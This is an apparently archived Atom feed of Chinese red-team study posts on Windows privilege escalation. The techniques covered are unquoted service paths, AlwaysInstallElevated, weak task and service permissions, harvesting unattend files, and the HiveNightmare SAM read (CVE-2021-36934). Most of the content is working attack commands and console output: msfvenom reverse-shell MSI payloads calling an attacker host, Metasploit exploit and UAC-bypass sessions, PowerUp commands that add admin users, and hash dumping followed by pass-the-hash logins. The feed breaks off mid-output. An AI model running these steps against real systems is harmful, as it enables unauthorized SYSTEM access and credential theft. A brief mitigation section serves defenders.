<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Teams Six</title>
  
  
  <link href="https://www.teamssix.com/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2021-07-28T05:18:06.612Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>Teams Six</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【内网学习笔记】浅谈几个 Windows 错误配置利用的方法</title>
    <link href="https://www.teamssix.com/year/20210728-130839.html"/>
    <id>https://www.teamssix.com/year/20210728-130839.html</id>
    <published>2021-07-28T05:08:39.000Z</published>
    <updated>2021-07-28T05:18:06.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Windows 系统的错误配置主要可以用来进行提权操作，比如可信任服务路径漏洞、计划任务程序以高权限运行、注册表键 AlwaysInstallElevated 等。</p><p>Windows 系统的错误配置除了用来进行提权，还可以用来寻找一些敏感信息，比如在一些安装配置的文件中或许就包含了一些明文账号密码等等。</p><p>接下来，简单看看这些错误配置的利用方法。</p><h1 id="0x01-可信任服务路径漏洞"><a href="#0x01-可信任服务路径漏洞" class="headerlink" title="0x01 可信任服务路径漏洞"></a>0x01 可信任服务路径漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>可信任服务路径 ( Trusted Service Paths ) 漏洞利用了 Windows 文件路径解析的特性，可信任服务路径指的是包含空格且没有引号的路径，比如像这样的路径：</p><pre><code>C:\Program Files\Common Files\WgpSec</code></pre><p>刚才说到了这个漏洞利用了 Windows 文件路径解析的特性，那我们先来了解一下这个特性。</p><p>假如有个文件路径是这样的：</p><pre><code>C:\Program Files\Common Files\WgpSec\TeamsSix.exe</code></pre><p>可以看到这个路径中有两个空格，那么对于 Windows 来说，它会尝试找到与空格前名字相匹配的程序，然后执行它。</p><p>以上面的 exe 文件路径为例，Windows 会依次尝试执行以下程序：</p><pre><code>C:\Program.exeC:\Program Files\Common.exeC:\Program Files\Common Files\WgpSec\TeamsSix.exe</code></pre><p>可以看到 Windows 尝试执行了三次才找到真正的程序。</p><p>由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。</p><p>因此是不是说我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的 TeamsSix.exe 程序重启时，系统就会执行我们的木马程序？</p><p>答案是的。</p><p>同时如果此时程序以 SYSTEM 运行，那我们就将获得一个 SYSTEM 权限的会话。</p><p>铺垫了那么多，现在就来复现一下。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>我们可以通过下面的命令来查找系统中存在可信任服务路径的程序。</p><pre><code>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr/i /v &quot;&quot;&quot;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727144557.png"></p><p>截图中可以看到 C:\Program Files\OpenSSH\bin\cygrunsrv.exe 存在包含空格且没有引号的路径。</p><p>我们可以直接使用 MSF 利用该漏洞，MSF 版本中利用该漏洞的模块是 trusted_service_path，但是在新版本中该模块的名称已经变更为 unquoted_service_path</p><pre><code>use windows/local/unquoted_service_pathset session 1run</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727153924.png"></p><p>可以看到已经获取到了管理员组账户的权限。</p><h1 id="0x02-注册表键-AlwaysInstallElevated"><a href="#0x02-注册表键-AlwaysInstallElevated" class="headerlink" title="0x02 注册表键 AlwaysInstallElevated"></a>0x02 注册表键 AlwaysInstallElevated</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>注册表 AlwaysInstallElevated 是一个策略设置项。Windows 允许低权限用户以 SYSTEM 权限运行安装文件。</p><p>如果启用此策略设置项，那么任何权限的用户都能以 SYSTEM 权限来安装恶意的 MSI（Microsoft Windows Installer）文件。</p><p>产生该漏洞的原因是由于用户在策略编辑器中开启了 Windows Installer 特权安装功能。</p><pre><code>组策略——计算机配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。组策略——用户配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727162552.png"></p><p>也可以直接使用命令行开启这两项注册表。</p><pre><code>reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</code></pre><p>然后使用 reg 查看这两项的键值，0x1 表示处于开启状态。</p><pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727163421.png"></p><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p><p>我们可以使用 PowerUp.ps1 脚本里的 Get-RegistryAlwaysInstallElevated 模块来检查相关注册表是否被设置。</p><p>在 PowerShell 中导入并执行脚本</p><pre><code>Import-Module .\PowerUp.ps1Get-RegistryAlwaysInstallElevated</code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用 -exec bypass 进行绕过。</p><pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727173239.png"></p><p>返回为 True，表示相关注册表被设置了，也就意味着 MSI 文件是以 SYSTEM 权限运行的。</p><p>运行 PowerUp 的 Write-UserAddMSI 模块</p><pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Write-UserAddMSI&#125;&quot;</code></pre><p>运行完后，会在当前目录下生成一个 UserAdd.msi 程序，此时以普通用户权限执行该 MSI 程序就会创建一个管理员账户。</p><p>直接双击或者命令行启动该 MSI 程序。</p><pre><code>msiexec /q /i UserAdd.msi</code></pre><p>msiexec 参数介绍：</p><pre><code>/quiet：安装过程中禁止向用户发送消息/qn：不使用GUI/q：隐藏安装界面/i：安装程序</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727165540.png"></p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中可以使用 exploit/windows/local/always_install_elevated 模块，直接获取 SYSTEM 权限。</p><pre><code>use exploit/windows/local/always_install_elevatedset session 1run</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727175000.png"></p><p>除了上面的操作外，还可以使用 msfvenom 生成 MSI 文件，从而以 SYSTEM 权限执行任意命令。</p><pre><code>msfvenom -p windows/exec CMD=&lt;命令&gt; -f msi &gt; calc.msi</code></pre><p>或者以 SYSTEM 权限上线</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.214.65 lport=4444 –f msi -o shell.msi</code></pre><h3 id="MSI-Wrapper"><a href="#MSI-Wrapper" class="headerlink" title="MSI Wrapper"></a>MSI Wrapper</h3><p>MSI Wrapper 是一个操作简单直观的 MSI 安装包生成工具，我们可以使用该工具制作一个包含木马的 MSI 安装包。</p><p>选择自己要导入的 EXE 木马文件位置和导出 MSI 安装包位置。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728090315.png"></p><p>设置运行时提升权限</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728091810.png"></p><p>之后 Application Id 随便选一个，其他操作默认就行，然后将 MSI 文件拷贝到目标主机上</p><p>开启攻击主机的监听，双击 MSI 文件之后就可以看到回连的会话已经是 SYSTEM 权限了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728092010.png"></p><h1 id="0x03-计划任务"><a href="#0x03-计划任务" class="headerlink" title="0x03 计划任务"></a>0x03 计划任务</h1><p>使用以下命令可以看到当前计算机的计划任务</p><pre><code>schtasks /query /fo list /v</code></pre><p>AccessChk 是微软官方提供的一款工具，因此往往不会引起杀软的告警，AccessChk 可用来进行一些系统或程序的高级查询、管理和故障排除工作。</p><p>AccessChk 下载地址：<a href="https://download.sysinternals.com/files/AccessChk.zip">https://download.sysinternals.com/files/AccessChk.zip</a></p><p>在第一次使用时，会弹出许可协议对话框，可以使用 /accepteula 进行关闭</p><pre><code>.\accesschk.exe /accepteula</code></pre><p>执行以下命令，查看指定目录的权限配置情况：</p><pre><code>.\accesschk.exe -dqv &quot;C:\Program Files&quot; </code></pre><p>如果攻击者以高权限运行的任务所在目录有写权限，就可以使用恶意程序覆盖原来的程序，这样计划任务下次运行时，就会以高权限运行恶意程序。</p><p>列出每个驱动器下所有权限配置不当的文件夹：</p><pre><code>.\accesschk.exe -uwdqs Users c:\ .\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\ </code></pre><p>列出每个驱动器下所有权限配置不当的文件：</p><pre><code>.\accesschk.exe -uwqs Users c:\*.*.\accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</code></pre><h1 id="0x04-自动安装配置文件"><a href="#0x04-自动安装配置文件" class="headerlink" title="0x04 自动安装配置文件"></a>0x04 自动安装配置文件</h1><p>管理员在对内网中多台机器进行环境配置时，通常不会一台一台的配置，往往会采用脚本批量化的方式。</p><p>在这个过程中，可能就会有一些包含安装配置信息的文件，比如在这些文件中包含了账号、密码，常见的文件路径如下：</p><pre><code>C:\sysprep.infC:\syspreg\sysprep.xmlC:\Windows\system32\sysprep.infC:\windows\system32\sysprep\sysprep.xmlC:\unattend.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattended.xmlC:\Windows\Panther\Unattend\Unattended.xmlC:\Windows\Panther\Unattend\Unattend.xmlC:\Windows\System32\Sysprep\Unattend.xmlC:\Windows\System32\Sysprep\Panther\Unattend.xml</code></pre><p>或者直接全局搜索 Unattend.xml 文件</p><pre><code>dir /b /s C:\Unattend.xml</code></pre><p>也可以直接使用 MSF 的 post/windows/gather/enum_unattend 模块</p><pre><code>use post/windows/gather/enum_unattendset session 1run</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728124041.png"></p><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/SYSTEM/254836.html">https://www.freebuf.com/articles/SYSTEM/254836.html</a></p><p><a href="https://www.freebuf.com/articles/network/250827.html">https://www.freebuf.com/articles/network/250827.html</a></p><p><a href="https://gist.github.com/sckalath/8dacd032b65404ef7411">https://gist.github.com/sckalath/8dacd032b65404ef7411</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Windows 系统的错误配置主要可以用来进行提权操作，比如可信任服务路径漏洞、计划任务程序以高权限</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现</title>
    <link href="https://www.teamssix.com/year/210725-074847.html"/>
    <id>https://www.teamssix.com/year/210725-074847.html</id>
    <published>2021-07-24T23:48:47.000Z</published>
    <updated>2021-07-24T23:51:15.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 10 月以来发布的版本，即 Windows 10 Version 1809 以后的版本。</p><p>不过值得注意的是该漏洞不影响 Windows Server 版本。</p><p>对于这个漏洞安全研究成员将其称为 HiveNightmare 或者 SeriousSAM ，该漏洞允许低权限的用户访问 Windows 系统文件，成功利用此漏洞的攻击者可以使用 SYSTEM 特权运行任意代码。</p><p>根据微软的介绍，出现本地提权漏洞是由于多个系统文件（包括安全账户管理器数据库SAM）过度许可访问控制列表所导致。</p><p>目前 POC 和 EXP 已经被公开，利用公开的 POC 可以低权限账号读取 SAM 等文件。</p><h1 id="0x01-检查是否易受攻击"><a href="#0x01-检查是否易受攻击" class="headerlink" title="0x01 检查是否易受攻击"></a>0x01 检查是否易受攻击</h1><p>执行以下命令：</p><pre><code>icacls C:\windows\system32\config\sam</code></pre><p>如果输出 BUILTIN\Users:(I)(RX) 表示该系统易受攻击。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723110132.png"></p><p>如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723111446.png"></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>EXP 地址为：<a href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p><p>作者编译好的 exe 文件：<a href="https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe">https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe</a></p><p>直接将作者编译好的 HiveNightmare.exe 拷贝到目标系统上执行，这里以 Windows 10 1809 为例。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723132944.png"></p><p>可以看到在低权限账号下，成功利用 CVE-2021–36934 读取到了 SAM、SECURITY、SYSTEM 三个文件。</p><p>除了 HiveNightmare 项目外，ShadowSteal 项目也能实现同样的效果，不过该项目需要编译使用，编译步骤如下：</p><p>在 Linux 下运行以下命令，以 Kali 为例。</p><pre><code>sudo apt-get install nimnimble install zippy argparsenimble install winimsudo apt-get install mingw-w64git clone https://github.com/HuskyHacks/ShadowSteal.git &amp;&amp; cd ShadowStealmake &amp;&amp; cd bin/ &amp;&amp; ls -l</code></pre><p>将编译好的 ShadowSteal.exe 放到目标系统上直接执行即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723141315.png"></p><p>在获得  SAM、SECURITY、SYSTEM 文件后，我们就可以使用 secretsdump.py 获取目标用户的 hash 了。</p><pre><code>git clone https://github.com/SecureAuthCorp/impacket.gitcd impacket/examplespython3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security SECURITY-2021-06-17 LOCAL</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723144111.png"></p><p>再使用 psexec.py 直接利用 administrator 的 hash 登录管理员账户，获得 SYSTEM 权限会话。</p><pre><code>python3 psexec.py -hashes xxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxx administrator@172.16.214.10 cmd.exe</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723155856.png"></p><h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>微软目前仍在研究该漏洞（编号为CVE-2021-36934），还未发布补丁更新。不过微软提供了一个临时性的解决方案。</p><p>1、限制对 %windir%\system32\config 内容的访问</p><p>​    以管理员身份打开命令提示符或 Windows PowerShell，运行以下命令：icacls %windir%\system32\config*.* /inheritance:e</p><p>2、删除卷影复制服务 (VSS) 卷影副本</p><p>​    删除限制访问 %windir%\system32\config 之前存在的任何系统还原点和卷影卷，创建一个新的系统还原点（如果需要）。</p><p>​    不过在操作时需要注意的是，从系统中删除卷影副本会影响系统和文件的“恢复“操作。</p><blockquote><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s/zSHwBUe-1ObumPt6v0pxMg">https://mp.weixin.qq.com/s/zSHwBUe-1ObumPt6v0pxMg</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247494395&idx=1&sn=c40e68e018c2112d7e3ce74b9a55c724">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247494395&amp;idx=1&amp;sn=c40e68e018c2112d7e3ce74b9a55c724</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 1</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="提权漏洞" scheme="https://www.teamssix.com/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Windows" scheme="https://www.teamssix.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】15、系统服务权限配置不当利用</title>
    <link href="https://www.teamssix.com/year/210722-173157.html"/>
    <id>https://www.teamssix.com/year/210722-173157.html</id>
    <published>2021-07-22T09:31:57.000Z</published>
    <updated>2021-07-22T09:57:53.839Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p><p>在 PowerShell 中导入并执行脚本</p><pre><code>Import-Module .\PowerUp.ps1Invoke-AllChecks</code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;</code></pre><pre><code>PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;[*] Running Invoke-AllChecks[*] Checking if user is in a local group with administrative privileges...[+] User is in a local group that grants administrative privileges![+] Run a BypassUAC attack to elevate privileges to admin.[*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...ServiceName    : MongoDBPath           : C:\Web\mongodb\bin\mongod.exe --auth --config C:\Web\mongodb\mongod.conf --s                 erviceModifiableFile : C:\Web\mongodb\mongod.confStartName      : LocalSystemAbuseFunction  : Install-ServiceBinary -ServiceName &#39;MongoDB&#39;</code></pre><p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p><pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;&quot;</code></pre><p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户。</p><pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;</code></pre><pre><code>PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;ServiceName                   ServicePath                   Command                       BackupPath-----------                   -----------                   -------                       ----------MongoDB                       C:\Web\mongodb\bin\mongod...  net user test Passw0rd /ad... C:\Web\mongodb\bin\mongod...</code></pre><p>重启系统，查看用户，发现 test 已经被添加到管理员组了。</p><pre><code>PS C:\Users\teamssix\Desktop&gt; net user test用户名                 test全名……本地组成员             *Administrators       *Users全局组成员             *None命令成功完成。</code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在 MSF 中，先看下已上线主机的权限</p><pre><code>meterpreter &gt; getuidServer username: TEAMSSIX\dev</code></pre><p>MSF 中对应服务权限配置不当的利用模块是 <code>exploit/windows/local/service_permissions</code></p><p>利用步骤如下：</p><pre><code>use exploit/windows/local/service_permissionsset payload windows/meterpreter/reverse_tcpset lhost 192.168.7.1set lport 4444set session 1run</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png"></p><p>可以看到会话直接被提升到了 SYSTEM 权限。</p><blockquote><p>参考文章：</p><p><a href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;PowerUp&quot;&gt;&lt;a href=&quot;#PowerUp&quot; class=&quot;headerlink&quot; title=&quot;PowerUp&quot;&gt;&lt;/a&gt;PowerUp&lt;/h3&gt;&lt;p&gt;PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：&lt;a href=&quot;https://g</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】14、发现主机缺失补丁</title>
    <link href="https://www.teamssix.com/year/210706-155005.html"/>
    <id>https://www.teamssix.com/year/210706-155005.html</id>
    <published>2021-07-06T07:50:05.000Z</published>
    <updated>2021-07-06T08:07:44.619Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p><h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p><pre><code>C:\Users\teamssix&gt; systeminfo……内容过多，此处省略……修补程序: 安装了 2 个修补程序。         [01]: KB2999226         [02]: KB976902……内容过多，此处省略……</code></pre><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p><pre><code>wmic qfe get Caption,Description,HotfixID,InstalledOn</code></pre><pre><code>C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOnCaption                                     Description  HotFixID   InstalledOnhttp://support.microsoft.com/?kbid=2999226  Update       KB2999226  11/26/2020http://support.microsoft.com/?kbid=976902   Update       KB976902   11/21/2010</code></pre><p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p><h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p><p>Sherlock 项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><p>导入脚本</p><pre><code>Import-Module .\Sherlock.ps1</code></pre><p>Sherlock 命令</p><pre><code>Find-ALLVulns    搜索所有未安装的补丁Find-MS16032    搜索单个漏洞</code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p><pre><code>msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patchesmsf6 post(windows/gather/enum_patches) &gt; set session 1session =&gt; 1msf6 post(windows/gather/enum_patches) &gt; run[+] KB2999226 installed on 11/26/2020[+] KB976902 installed on 11/21/2010[*] Post module execution completed</code></pre><p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p><p>首先查看下当前会话权限</p><pre><code>msf6 post(windows/gather/enum_patches) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; execute -if &quot;whoami /groups&quot;Process 3048 created.Channel 6 created.组信息-----------------组名                                   类型   SID          属性====================================== ====== ============ ==============================Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组</code></pre><p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p><p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p><pre><code>meterpreter &gt; background[*] Backgrounding session 1...msf6 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggestermsf6 post(multi/recon/local_exploit_suggester) &gt; set session 1session =&gt; 1msf6 post(multi/recon/local_exploit_suggester) &gt; run[*] 172.16.214.4 - Collecting local exploits for x86/windows...[*] 172.16.214.4 - 38 exploit checks are being tried...[+] 172.16.214.4 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.[*] Post module execution completed</code></pre><p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p><pre><code>msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/bypassuac_eventvwr[*] Using configured payload windows/meterpreter/reverse_tcpmsf6 exploit(windows/local/bypassuac_eventvwr) &gt; set session 1session =&gt; 1msf6 exploit(windows/local/bypassuac_eventvwr) &gt; run[*] Started reverse TCP handler on 10.101.22.38:4444[*] UAC is Enabled, checking level...[+] Part of Administrators group! Continuing...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[*] Configuring payload and stager registry keys ...[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.[*] Sending stage (175174 bytes) to 172.16.214.4[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800[*] Cleaning up registry keys ...meterpreter &gt; execute -if &quot;whoami /groups&quot;Process 3048 created.Channel 1 created.组信息-----------------组名                                 类型   SID          属性==================================== ====== ============ ==========================================Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     